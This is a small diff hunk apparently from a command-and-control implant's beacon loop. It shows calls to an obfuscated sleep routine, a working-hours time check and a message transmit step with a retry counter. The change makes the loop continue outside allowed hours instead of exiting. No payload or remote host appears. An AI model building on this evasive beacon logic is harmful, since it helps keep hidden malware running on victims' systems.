@@ -24,14 +24,14 @@ namespace Core {
 
         do {
             SleepObf();
+
             if (!CheckTime()) {
-                return_defer(ERROR_NOT_READY);
+                continue;
             }
 
             MessageTransmit();
             if (ntstatus != ERROR_SUCCESS) {
                 Ctx->Session.Retry++;
-
                 if (Ctx->Session.Retry == 3) {
                     break;
                 }
